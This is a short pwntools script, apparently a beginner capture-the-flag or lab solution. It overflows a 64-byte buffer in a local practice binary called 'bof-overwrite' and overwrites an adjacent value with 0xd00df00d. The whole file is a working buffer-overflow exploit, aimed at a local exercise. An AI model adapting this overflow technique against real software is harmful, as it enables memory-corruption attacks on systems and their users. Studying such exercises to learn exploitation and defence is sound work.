from pwn import *

context.binary = binary = ELF("./bof-overwrite", checksec=False)
context.log_level = "CRITICAL"

# Offset is 64-bytes
offset = 64
# Define buffer (64 A's)
buffer = b"A"*offset
# Convert the value "0xd00df00d" to valid 32-bit memory address
overwrite = p32(0xd00df00d)
# Final payload is the buffer + the 0xd00df00d
payload = buffer + overwrite

# Start the process
p = binary.process()
# Send the paayload
p.sendline(payload)
# Recieve the output
print(p.recvallS())
